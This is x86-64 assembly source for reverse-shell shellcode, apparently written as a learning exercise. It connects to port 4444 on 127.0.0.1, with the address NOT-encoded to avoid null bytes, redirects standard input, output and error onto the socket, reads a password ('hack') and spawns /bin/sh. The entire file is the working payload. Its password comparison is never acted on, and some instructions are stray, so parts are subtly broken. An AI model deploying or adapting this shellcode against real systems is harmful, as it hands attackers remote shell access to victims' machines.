global _start

_start:
    
    xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi 
	mul rsi
	add rcx, 0x3       
	push byte 0x2   ;pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall
	
	; copying the socket descripter from rax to rdi register so that we can use it further 

	xchg rax, rdi
	
	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure
	
	xor rax, rax
	push rax                         ; bzero(&server.sin_zero, 8)
	mov ebx , 0xfeffff80             ; ip address 127.0.0.1 "noted" to remove null
	not ebx
	mov dword [rsp-4], ebx
	sub rsp , 4                      ; adjust the stack
	push word 0x5c11                 ; port 4444 in network byte order
	push word 0x02                   ; AF_INET
	push rsp
	pop rsi
	
	
	push 0x10
	pop rdx
	push 0x2a
	pop rax
	syscall
	
	push 0x3                           
	pop rsi								; setting argument to 3 



duplicate:
    dec esi                            
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate
    
password_check:
	
	push rsp
	pop rsi
	xor rax, rax   ; system read syscall value is 0 so rax is set to 0
	syscall
	push 0x6b636168 ; password to connect to shell is hack which is pushed in reverse and hex encoded
	pop rax
	lea rdi, [rel rsi]
	scasd           ; comparing the user input and stored password in the stack
	
	
    
execve:                                      ; Execve format  , execve("/bin/sh", 0 , 0)
     xor rsi , rsi
     mul rsi                                 ; zeroed rax , rdx register 
     push ax                                 ; terminate string with null
     mov rbx , 0x68732f2f6e69622e            ; "/bin//sh"  in reverse order 
     inc rbx
     add rcx, 2
     push rbx
     push rsp
     pop rdi                                 ; set RDI
     push byte 0x3b                          ; execve syscall number (59)
     pop rax
     syscall
